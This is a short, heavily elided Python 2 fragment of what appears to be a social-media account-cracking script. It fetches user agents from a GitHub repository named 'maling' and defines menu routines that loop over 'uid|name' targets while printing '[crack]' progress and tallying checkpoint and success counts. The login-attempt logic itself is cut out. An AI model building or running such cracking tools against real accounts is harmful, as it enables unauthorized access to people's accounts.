...
uas =requests.get('https://raw.githubusercontent.com/amdiutama/maling/main/ua.txt').text.strip()
id = []
cp = []
ok = []
loop = 0
...
def pilih_menumbasic():
    ...
    def main(arg):
        global loop
        print'\r\x1b[0m [crack] %s/%s cp-:%s ' % (loop, len(id), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
...
def manualmbasic():
    ...
    def main(arg):
        global loop
        print'\r [cracking] %s/%s cp-:%s ' % (loop, len(id), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
